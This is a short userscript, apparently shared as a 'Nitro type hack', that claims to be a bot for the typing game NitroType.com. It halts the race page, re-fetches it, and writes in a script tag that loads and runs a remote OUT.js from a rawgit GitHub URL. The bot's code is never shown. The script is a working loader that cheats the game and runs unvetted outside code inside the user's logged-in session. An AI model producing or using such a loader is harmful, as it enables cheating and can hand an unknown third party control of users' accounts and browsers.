# xnihq89whn9cn-uiqasnviu
Nitro type hack
// ==UserScript==
// @name         jch3iuwfvn3vniuwegnfceiuws NitroType hack
// @version      1.0.0
// @description  A fast, easy to use bot for NitroType.com
// @author       jch3iuwfvn3vniuwegnfceiuws
// @match        https://www.nitrotype.com/race/*
// @match        https://www.nitrotype.com/race
// @match        http://www.nitrotype.com/race
// @match        http://www.nitrotype.com/race/*
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @namespace https://greasyfork.org/users/120765
// ==/UserScript==
(function() {
	"use strict";
	var OUT = "https://rawgit.com/DragoXqwas/XxTYPE/master/OUT/OUT.js";
	var OUT_SCRIPT = "<script src='" + OUT + "'></script>\n";
 
	// Completely halt the loading of the window, to prevent the page from being loaded more than once
	window.stop();
	document.documentElement.innerHTML = null;
 
	// Request for the current document
	GM_xmlhttpRequest({
		method: "GET",
		url: window.location.href,
		onload: function(e) {
			// Write a modified page to the document
			var doc = e.responseText;
			document.open();
			document.write(OUT_SCRIPT + doc);
			document.close();
			// The extension script will now be loaded onto the document
		}
	})
})();
